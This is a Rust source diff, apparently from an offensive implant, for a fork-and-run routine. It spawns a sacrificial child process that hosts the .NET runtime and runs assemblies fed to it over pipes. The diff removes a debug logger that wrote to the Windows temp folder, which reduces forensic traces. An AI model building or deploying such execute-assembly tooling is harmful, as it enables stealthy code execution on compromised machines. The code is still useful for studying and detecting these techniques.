@@ -416,24 +416,12 @@ pub fn exec_dotnet(asm_bytes: &[u8], args: &str, child_mode: bool) -> String {
     }
 }
 
-// ── Debug log helper (writes to rust_dotnet_debug.log) ───────────────────────
-
-fn dlog(msg: &str) {
-    use std::io::Write;
-    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true)
-        .open("C:\\Windows\\Temp\\rust_dotnet_debug.log") {
-        let _ = writeln!(f, "{}", msg);
-    }
-}
-
 // ── Fork-and-run: spawn a sacrificial child process to host the CLR ───────────
 
 pub fn fork_run_assembly(asm_bytes: &[u8], args: &str) -> String {
     unsafe {
-        dlog(&format!("fork_run_assembly: start, asm_len={}, args={:?}", asm_bytes.len(), args));
         let mut exe = [0u16; MAX_PATH as usize + 1];
         if GetModuleFileNameW(0, exe.as_mut_ptr(), MAX_PATH) == 0 {
-            dlog("fork_run_assembly: GetModuleFileNameW failed → fallback");
             return "[!] fork_run: GetModuleFileNameW failed".into();
         }
 
@@ -444,19 +432,16 @@ pub fn fork_run_assembly(asm_bytes: &[u8], args: &str) -> String {
         let (mut asm_rd, mut asm_wr) = (0isize, 0isize);
         let sa_ptr = &sa as *const SecurityAttr as *const core::ffi::c_void;
         if CreatePipe(&mut asm_rd, &mut asm_wr, sa_ptr, 0) == 0 {
-            dlog("fork_run_assembly: CreatePipe(stdin) failed → error");
             return "[!] fork_run: CreatePipe stdin failed".into();
         }
         SetHandleInformation(asm_wr, HANDLE_FLAG_INHERIT, 0);
 
         let (mut out_rd, mut out_wr) = (0isize, 0isize);
         if CreatePipe(&mut out_rd, &mut out_wr, sa_ptr, 0) == 0 {
-            dlog("fork_run_assembly: CreatePipe(stdout) failed → error");
             CloseHandle(asm_rd); CloseHandle(asm_wr);
             return "[!] fork_run: CreatePipe stdout failed".into();
         }
         SetHandleInformation(out_rd, HANDLE_FLAG_INHERIT, 0);
-        dlog("fork_run_assembly: pipes created OK");
 
         SetEnvironmentVariableA(b"__ENDGAME_CLR_CHILD\0".as_ptr(), b"1\0".as_ptr());
 
@@ -479,11 +464,9 @@ pub fn fork_run_assembly(asm_bytes: &[u8], args: &str) -> String {
         CloseHandle(out_wr);
 
         if ok == 0 {
-            dlog("fork_run_assembly: CreateProcessW failed → error");
             CloseHandle(asm_wr); CloseHandle(out_rd);
             return "[!] fork_run: CreateProcessW failed".into();
         }
-        dlog(&format!("fork_run_assembly: child spawned pid={}", pi.dw_pid));
 
         // Writer thread: send [4LE args_len][args][4LE asm_len][asm] to child stdin.
         let asm_clone = asm_bytes.to_vec();
@@ -551,7 +534,6 @@ pub fn fork_run_assembly(asm_bytes: &[u8], args: &str) -> String {
         WaitForSingleObject(pi.h_process, 5000);
         CloseHandle(pi.h_process); CloseHandle(pi.h_thread);
 
-        dlog(&format!("fork_run_assembly: done, output_bytes={}", output.len()));
         if output.is_empty() { return "(no output from child)".into(); }
         String::from_utf8_lossy(&output).into_owned()
     }
@@ -560,7 +542,6 @@ pub fn fork_run_assembly(asm_bytes: &[u8], args: &str) -> String {
 // ── Child entry: read protocol from stdin, run CLR via pipe, exit ─────────────
 
 pub fn clr_child_run() {
-    dlog("clr_child_run: entered");
     unsafe {
         let h_in = GetStdHandle(STD_INPUT_HANDLE);
 
@@ -589,7 +570,6 @@ pub fn clr_child_run() {
         let mut asm_buf = vec![0u8; asm_len];
         if asm_len > 0 && !read_exact(&mut asm_buf) { std::process::exit(1); }
 
-        dlog(&format!("clr_child_run: executing dotnet asm_len={} args={:?}", asm_buf.len(), args_str));
         exec_dotnet(&asm_buf, &args_str, true); // calls std::process::exit(0) internally
         std::process::exit(0);
     }
